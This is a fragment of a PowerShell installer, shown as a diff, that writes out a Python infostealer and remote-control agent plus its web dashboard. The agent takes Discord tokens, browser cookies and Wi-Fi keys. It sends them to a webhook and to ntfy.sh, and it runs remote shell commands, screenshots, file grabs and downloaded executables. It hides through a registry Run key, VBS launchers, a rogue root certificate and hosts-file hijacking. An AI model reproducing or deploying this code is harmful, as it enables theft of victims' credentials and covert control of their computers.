-'if(!SEL)return;const v=V[SEL];if(!v)return;',
-'document.getElementById(~~sel~~).textContent=`${v.host} / ${v.user} / pid ${v.pid} / ${v.os}`;',
-'document.getElementById(~~log~~).innerHTML=v.res.slice().reverse().map(r=>{',
-'if(r.kind===~~shot~~)return `<div class=~r~><span class=~k~>[shot]</span><img src=~data:image/png;base64,${r.b64}~></div>`;',
-'if(r.kind===~~get~~)return `<div class=~r~><span class=~k~>[${esc(r.name)}]</span> <a style=~color:#3b82f6~ download=~${esc(r.name)}~ href=~data:application/octet-stream;base64,${r.b64}~>save</a></div>`;',
-'return `<div class=~r~><span class=~k~>[${esc(r.kind)}]</span>${String.fromCharCode(10)}${esc(r.out||~~)}</div>`}).join(~~)}',
-'async function s(cmd,arg){if(!SEL)return alert(~~pick a victim~~);await put(B+~~-c-~~+SEL,{t:~~c~~,vid:SEL,d:await enc({id:crypto.randomUUID().slice(0,12),cmd,arg:arg||~~,vid:SEL})})}',
-'async function go(){const v=document.getElementById(~~i~~).value;if(!v)return;await s(~~shell~~,v);document.getElementById(~~i~~).value=~~}',
-'(async()=>{const h=location.hash.slice(1);const seg=h.split(~~/~~);const bp=(seg[0]||~~).split(~~.~~);',
-'B=bp[0];P=bp[1]||prompt(~~key:~~);if(!B){B=prompt(~~bucket:~~);if(!B)return}',
-'LAST=Math.floor(Date.now()/1000)-120;await derive();SEL=seg[1]||null;',
-'setInterval(pull,2000);setInterval(render,1000);pull()})();',
-'</script></body></html>'
-);[IO.File]::WriteAllText("C:\seven\ui.html",(($u -join "`n").Replace('~',[char]39)));& $py fake.py --cert;Import-Certificate -FilePath .\seven.cer -CertStoreLocation 'Cert:\CurrentUser\Root'|Out-Null;$h="$env:windir\System32\drivers\etc\hosts";Copy-Item $h "$h.bak" -Force;(Get-Content $h) -notmatch 'sevenauthapi'|Set-Content $h;Add-Content $h '127.0.0.1 sevenauthapi.com';Add-Content $h '127.0.0.1 www.sevenauthapi.com';ipconfig /flushdns|Out-Null;Copy-Item .\fake.py,.\cert.pem,.\seven.cer $dst -Force;$pyw=$py -replace 'python\.exe$','pythonw.exe';if(-not(Test-Path $pyw)){$pyw=$py};$vbs="$dst\boot.vbs";"WScript.Sleep 4000 + Int(Rnd*25000)`r`nCreateObject(""WScript.Shell"").Run """"""$pyw"""""" """"""$dst\fake.py"""""", 0, False"|Set-Content $vbs -Encoding ascii;wscript.exe $vbs;$url=$DASH+'#'+$BUCKET+'.'+$PASS;$url|Set-Content C:\seven\dashboard.txt;Set-Clipboard $url -EA 0;Start-Sleep 5;Write-Host "`nDONE" -ForegroundColor Green;Write-Host "dashboard : $url";Write-Host "ui.html   : C:\seven\ui.html";Write-Host "bucket    : $BUCKET"
+'',
+'ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)',
+'ctx.load_cert_chain("cert.pem")',
+'s = HTTPServer(("0.0.0.0", 443), H)',
+'s.socket = ctx.wrap_socket(s.socket, server_side=True)',
+'print("fake :443")',
+'s.serve_forever()'
+)|Set-Content .\fake.py -Encoding utf8
+& $py makecert.py
+Import-Certificate -FilePath .\seven.cer -CertStoreLocation 'Cert:\CurrentUser\Root'|Out-Null
+$h="$env:windir\System32\drivers\etc\hosts"
+Copy-Item $h "$h.bak" -Force
+(Get-Content $h) -notmatch 'sevenauthapi'|Set-Content $h
+Add-Content $h '127.0.0.1 sevenauthapi.com'
+Add-Content $h '127.0.0.1 www.sevenauthapi.com'
+ipconfig /flushdns|Out-Null
+netsh advfirewall firewall delete rule name="WinSecSvc"|Out-Null
+netsh advfirewall firewall add rule name="WinSecSvc" dir=in action=allow protocol=TCP localport=443|Out-Null
+@"@'
+import base64,ctypes,glob,hashlib,json,os,platform,re,secrets,shutil,socket,sqlite3,subprocess,sys,tempfile,threading,time,urllib.request,uuid,winreg
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+B="$BUCKET"
+PASS="$PASS"
+HOOK="$HOOK"
+DASH="$DASH"
+RES=B+"-r"
+CMD=B+"-c"
+K=HKDF(algorithm=hashes.SHA256(),length=32,salt=b"sv7",info=b"c2").derive(PASS.encode())
+BP="C:\\seven"
+FP=os.path.join(BP,"fake.py")
+HIT=os.path.join(BP,".hit")
+DST=os.path.join(os.environ.get("APPDATA","."),"Microsoft","Windows","svc")
+ST=os.path.join(DST,"st.json")
+OUT=os.path.join(DST,"out")
+PY=sys.executable.replace("pythonw.exe","python.exe")
+PYW=sys.executable
+NOWIN=0x08000000
+NEWC=0x00000010
+YEAR=365*24*3600*1000
+POLL=4
+SEEN=set()
+TOK=re.compile(r"mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}")
+ENC=re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")
+
+def enc(o):
+    n=secrets.token_bytes(12)
+    return base64.urlsafe_b64encode(n+AESGCM(K).encrypt(n,json.dumps(o).encode(),None)).decode().rstrip("=")
+
+def dec(s):
+    b=base64.urlsafe_b64decode(s+"="*(-len(s)%4))
+    return json.loads(AESGCM(K).decrypt(b[:12],b[12:],None))
+
+def put(t,o):
+    r=urllib.request.Request("https://ntfy.sh/"+t,json.dumps(o).encode(),{"User-Agent":"curl/8.5.0"})
+    urllib.request.urlopen(r,timeout=15).read()
+
+def poll(t,since):
+    u="https://ntfy.sh/"+t+"/json?poll=1&since="+str(since)
+    out=[]
+    try:
+        r=urllib.request.Request(u,headers={"User-Agent":"curl/8.5.0"})
+        for line in urllib.request.urlopen(r,timeout=20):
+            line=line.strip()
+            if not line:continue
+            try:e=json.loads(line)
+            except Exception:continue
+            if e.get("event")=="message" and e.get("message"):out.append((e.get("time",0),e["message"]))
+    except Exception:pass
+    return out
+
+class BLOB(ctypes.Structure):
+    _fields_=[("cb",ctypes.c_uint32),("pb",ctypes.POINTER(ctypes.c_char))]
+
+def dpa(d):
+    buf=ctypes.create_string_buffer(d,len(d))
+    i=BLOB(len(d),ctypes.cast(buf,ctypes.POINTER(ctypes.c_char)))
+    o=BLOB()
+    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i),None,None,None,None,0,ctypes.byref(o)):raise OSError
+    r=ctypes.string_at(o.pb,o.cb)
+    ctypes.windll.kernel32.LocalFree(o.pb)
+    return r
+
+def ckey(root):
+    try:
+        b=base64.b64decode(json.load(open(os.path.join(root,"Local State"),encoding="utf-8"))["os_crypt"]["encrypted_key"])
+        if b[:5]==b"DPAPI":b=b[5:]
+        k=dpa(b)
+        return k if len(k)==32 else None
+    except Exception:return None
+
+def cdec(v,k):
+    if not v:return ""
+    p=v[:3]
+    if p in (b"v10",b"v11",b"v20",b"v24"):
+        if not k:return ""
+        try:t=AESGCM(k).decrypt(v[3:15],v[15:],None)
+        except Exception:return ""
+        if p==b"v24" and len(t)>32:t=t[32:]
+        return t.decode("utf-8","replace")
+    return v.decode("utf-8","replace")
+
+def cp(s):
+    t=os.path.join(tempfile.mkdtemp(prefix="s7"),"db")
+    for _ in range(4):
+        try:
+            shutil.copy2(s,t);return t
+        except Exception:time.sleep(0.25)
+    return None
+
+def toks():
+    f={}
+    for base in (os.environ.get("APPDATA"),os.environ.get("LOCALAPPDATA")):
+        if not base:continue
+        for app in ("discord","discordcanary","discordptb","Lightcord"):
+            r=os.path.join(base,app)
+            if not os.path.isdir(r):continue
+            k=ckey(r)
+            for ls in glob.glob(os.path.join(r,"**","leveldb"),recursive=True):
+                for x in glob.glob(os.path.join(ls,"*")):
+                    try:s=open(x,"rb").read().decode("latin-1")
+                    except Exception:continue
+                    for m in TOK.findall(s):f.setdefault(m,"plain")
+                    for m in ENC.findall(s):
+                        try:
+                            b=base64.b64decode(m)
+                            p=AESGCM(k).decrypt(b[:12],b[12:],None).decode("utf-8","replace")
+                        except Exception:continue
+                        for t in TOK.findall(p):f.setdefault(t,"aes")
+    return [{"token":a,"kind":b} for a,b in f.items()]
+
+BR={"chrome":("LOCALAPPDATA","Google/Chrome/User Data"),"edge":("LOCALAPPDATA","Microsoft/Edge/User Data"),"brave":("LOCALAPPDATA","BraveSoftware/Brave-Browser/User Data"),"vivaldi":("LOCALAPPDATA","Vivaldi/User Data"),"chromium":("LOCALAPPDATA","Chromium/User Data"),"opera":("APPDATA","Opera Software/Opera Stable"),"operagx":("APPDATA","Opera Software/Opera GX Stable")}
+
+def cks():
+    out={}
+    for n,(e,p) in BR.items():
+        r=os.path.join(os.environ.get(e,""),p.replace("/",os.sep))
+        if not os.path.isdir(r):continue
+        k=ckey(r)
+        for c in glob.glob(os.path.join(r,"**","Cookies"),recursive=True):
+            t=cp(c)
+            if not t:continue
+            rows=[]
+            try:
+                db=sqlite3.connect(t)
+                rows=db.execute("select host_key,name,encrypted_value,path,expires_utc,is_secure,is_httponly from cookies limit 400").fetchall()
+                db.close()
+            except Exception:pass
+            finally:
+                try:os.remove(t)
+                except Exception:pass
+            for h,nm,v,pa,ex,se,ho in rows:
+                d=cdec(v,k)
+                if d:out.setdefault(n,[]).append({"host":h,"name":nm,"value":d,"path":pa,"secure":bool(se),"httpOnly":bool(ho),"expires":ex})
+    for pr in glob.glob(os.path.join(os.environ.get("APPDATA",""),"Mozilla","Firefox","Profiles","*")):
+        c=os.path.join(pr,"cookies.sqlite")
+        if not os.path.isfile(c):continue
+        t=cp(c)
+        if not t:continue
+        try:
+            db=sqlite3.connect(t)
+            for h,nm,v,pa,ex,se,ho in db.execute("select host,name,value,path,expiry,isSecure,isHttpOnly from moz_cookies limit 400"):
+                out.setdefault("firefox",[]).append({"host":h,"name":nm,"value":v,"path":pa,"secure":bool(se),"httpOnly":bool(ho),"expires":ex})
+            db.close()
+        except Exception:pass
+        finally:
+            try:os.remove(t)
+            except Exception:pass
+    return out
+
+def state():
+    try:return json.load(open(ST,encoding="utf-8"))
+    except Exception:return {}
+
+def save(d):
+    os.makedirs(DST,exist_ok=True)
+    json.dump(d,open(ST,"w",encoding="utf-8"))
+
+def vid():
+    d=state()
+    if not d.get("vid"):
+        d["vid"]=secrets.token_hex(4);save(d)
+    return d["vid"]
+
+def chunk(t,cid,s):
+    n=2800
+    parts=[s[i:i+n] for i in range(0,len(s),n)] or [""]
+    for i,p in enumerate(parts):put(RES,{"t":t,"vid":vid(),"cid":cid,"i":i,"n":len(parts),"d":p})
+
+def grab():
+    d={"host":os.environ.get("COMPUTERNAME",""),"user":os.environ.get("USERNAME",""),"os":platform.platform(),"tokens":toks(),"cookies":cks(),"when":time.strftime("%Y-%m-%d %H:%M:%S")}
+    try:
+        os.makedirs(OUT,exist_ok=True)
+        open(os.path.join(OUT,"last.json"),"w",encoding="utf-8").write(json.dumps(d,indent=1))
+    except Exception:pass
+    return d
+
+def post(blob,new,d):
+    bnd="----s7"+secrets.token_hex(8)
+    ip=""
+    try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode()
+    except Exception:pass
+    link=(DASH+"/#"+B+"."+PASS+"/"+vid())
+    L=[("NEW VICTIM" if new else "UPDATE"),"host: "+d["host"],"user: "+d["user"],"ip: "+ip,"os: "+d["os"],"vid: "+vid(),"tokens: "+str(len(d["tokens"])),"cookies: "+str(sum(len(v) for v in d["cookies"].values())),"","dashboard: "+link]
+    head=("--"+bnd+"\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n"+json.dumps({"content":"```\n"+"\n".join(L)+"\n```"})+"\r\n")
+    fil="--"+bnd+"\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"d.enc\"\r\nContent-Type: application/octet-stream\r\n\r\n"
+    body=head.encode()+fil.encode()+blob.encode()+("\r\n--"+bnd+"--\r\n").encode()
+    r=urllib.request.Request(HOOK,body,{"Content-Type":"multipart/form-data; boundary="+bnd,"User-Agent":"Mozilla/5.0"})
+    urllib.request.urlopen(r,timeout=20).read()
+
+def report(d,new):
+    blob=enc(d)
+    chunk("g","boot",blob)
+    try:post(blob,new,d)
+    except Exception:pass
+
+def b64f(p):return base64.b64encode(open(p,"rb").read()).decode()
+
+def alive():
+    try:
+        s=socket.socket();s.settimeout(1);r=s.connect_ex(("127.0.0.1",443));s.close()
+        return r==0
+    except Exception:return False
+
+def ensure_bp():
+    if alive():return
+    try:subprocess.Popen('start "win" /min "'+PY+'" "'+FP+'"',shell=True,creationflags=NOWIN)
+    except Exception:pass
+
+PSHOT="Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.SystemInformation]::VirtualScreen;$i=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($i);$g.CopyFromScreen($b.Left,$b.Top,0,0,$i.Size);$i.Save($env:TEMP+chr(92)+\"s.png\");Write-Output ($env:TEMP+chr(92)+\"s.png\")"
+PSWIFI="netsh wlan show profiles|Select-String \"All User Profile\"|%{($_.ToString().Split(\":\")[1]).Trim()}|%{netsh wlan show profile name=$_ key=clear}|Select-String \"SSID|Key Content\""
+
+def run_cmd(c):
+    global POLL
+    k=c.get("cmd","");a=c.get("arg","");cid=c.get("id","")
+    try:
+        if k=="shell":
+            p=subprocess.run(a,shell=True,capture_output=True,text=True,errors="replace",timeout=180,creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"shell","out":(p.stdout or "")+(p.stderr or "")}))
+        elif k=="ps":
+            p=subprocess.run(["powershell","-NoP","-C",a],capture_output=True,text=True,errors="replace",timeout=180,creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"ps","out":(p.stdout or "")+(p.stderr or "")}))
+        elif k=="shot":
+            p=subprocess.run(["powershell","-NoP","-C",PSHOT],capture_output=True,text=True,errors="replace",timeout=90,creationflags=NOWIN)
+            f=(p.stdout or "").strip()
+            chunk("r",cid,enc({"kind":"shot","b64":b64f(f)}));os.remove(f)
+        elif k=="get":chunk("r",cid,enc({"kind":"get","name":os.path.basename(a),"b64":b64f(a)}))
+        elif k=="ls":chunk("r",cid,enc({"kind":"ls","out":"\n".join(os.listdir(a or "."))}))
+        elif k=="dl":
+            t=os.path.join(tempfile.gettempdir(),secrets.token_hex(4)+".exe")
+            urllib.request.urlretrieve(a,t)
+            subprocess.Popen([t],creationflags=NOWIN,close_fds=True)
+            chunk("r",cid,enc({"kind":"dl","out":"started "+t}))
+        elif k=="put":
+            url,_,p=a.partition("|")
+            urllib.request.urlretrieve(url.strip(),p.strip())
+            chunk("r",cid,enc({"kind":"put","out":"saved "+p.strip()}))
+        elif k=="clip":
+            p=subprocess.run(["powershell","-NoP","-C","Get-Clipboard"],capture_output=True,text=True,errors="replace",creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"clip","out":p.stdout or ""}))
+        elif k=="drives":
+            p=subprocess.run(["powershell","-NoP","-C","Get-PSDrive -PSProvider FileSystem|Format-Table -Auto"],capture_output=True,text=True,errors="replace",creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"drives","out":p.stdout or ""}))
+        elif k=="wifi":
+            p=subprocess.run(["powershell","-NoP","-C",PSWIFI],capture_output=True,text=True,errors="replace",timeout=60,creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"wifi","out":p.stdout or ""}))
+        elif k=="msg":
+            subprocess.run(["powershell","-NoP","-C","Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('"+a.replace("'","''")+"')"],capture_output=True,creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"msg","out":"shown"}))
+        elif k=="lock":
+            subprocess.run("rundll32.exe user32.dll,LockWorkStation",shell=True,creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"lock","out":"locked"}))
+        elif k=="startup":
+            winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE),"WinSec"+secrets.token_hex(2),0,winreg.REG_SZ,a)
+            chunk("r",cid,enc({"kind":"startup","out":"added"}))
+        elif k=="grab":
+            chunk("r",cid,enc({"kind":"grab","out":"ok"}));report(grab(),False)
+        elif k=="kill":chunk("r",cid,enc({"kind":"kill","out":subprocess.run("taskkill /f /im "+a,shell=True,capture_output=True,text=True,errors="replace").stdout}))
+        elif k=="sleep":
+            POLL=max(2,int(a or 4));chunk("r",cid,enc({"kind":"sleep","out":str(POLL)}))
+        elif k=="rm":
+            chunk("r",cid,enc({"kind":"rm","out":"bye"}))
+            subprocess.Popen(["powershell","-NoP","-Ep","Bypass","-C","Start-Sleep 3;Get-Process python,pythonw|?{$_.CommandLine -like '*svc*' -or $_.CommandLine -like '*fake.py*'}|Stop-Process -Force -EA 0;Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name WinSecSvc -EA 0;Remove-Item '"+DST+"' -Recurse -Force -EA 0;Remove-Item 'C:\\seven' -Recurse -Force -EA 0;$h='C:\\Windows\\System32\\drivers\\etc\\hosts';(Get-Content $h) -notmatch 'sevenauthapi'|Set-Content $h;Get-ChildItem Cert:\\CurrentUser\\Root|?{$_.Subject -match 'sevenauthapi'}|Remove-Item;netsh advfirewall firewall delete rule name=WinSecSvc"],creationflags=NOWIN)
+            time.sleep(1);os._exit(0)
+    except Exception as e:
+        try:chunk("r",cid,enc({"kind":k,"out":"ERR "+repr(e)}))
+        except Exception:pass
+
+def beacon():
+    ip=""
+    try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode()
+    except Exception:pass
+    put(RES,{"t":"b","vid":vid(),"d":enc({"host":os.environ.get("COMPUTERNAME",""),"user":os.environ.get("USERNAME",""),"os":platform.platform(),"ip":ip,"pid":os.getpid()})})
+
+def agent():
+    last=int(time.time())-5
+    n=0
+    while True:
+        try:
+            if os.path.exists(HIT):
+                try:os.remove(HIT)
+                except Exception:pass
+                threading.Thread(target=report,args=(grab(),False),daemon=True).start()
+            for ts,m in poll(CMD+","+CMD+"-"+vid(),last):
+                if ts>last:last=ts
+                try:c=dec(m)
+                except Exception:continue
+                if c.get("vid") not in (None,vid()):continue
+                if c.get("id") in SEEN:continue
+                SEEN.add(c.get("id"))
+                threading.Thread(target=run_cmd,args=(c,),daemon=True).start()
+            n+=1
+            if n%15==1:beacon()
+            if n%60==0:ensure_bp()
+        except Exception:pass
+        time.sleep(POLL+secrets.randbelow(3)*0.4)
+
+def boot():
+    time.sleep(1)
+    ensure_bp()
+    d=grab()
+    st=state()
+    new=not st.get("notified")
+    if new:
+        st["notified"]=1;save(st)
+    report(d,new)
+    beacon()
+
+threading.Thread(target=boot,daemon=True).start()
+threading.Thread(target=agent,daemon=True).start()
+while True:time.sleep(3600)
+'@ | Set-Content "$svc\agent.py" -Encoding utf8
+Copy-Item .\cert.pem "$svc\cert.pem" -Force
+$vbs="$svc\run.vbs"
+@"
+WScript.Sleep 3000 + Int(Rnd*20000)
+CreateObject("WScript.Shell").Run """$pyw"" ""$svc\agent.py""", 0, False
+"@ | Set-Content $vbs -Encoding ascii
+New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name WinSecSvc -Value "wscript.exe `"$vbs`"" -PropertyType String -Force|Out-Null
+wscript.exe $vbs
+Start-Process $py -ArgumentList 'fake.py' -WorkingDirectory C:\seven -WindowStyle Minimized
+$url=$DASH+'/#'+$BUCKET+'.'+$PASS
+$url|Set-Content C:\seven\dashboard.txt
+Set-Clipboard $url -EA 0
+Start-Sleep 4
+Write-Host "`nDONE" -ForegroundColor Green
+Write-Host "dashboard : $url"
+Write-Host "bucket    : $BUCKET"
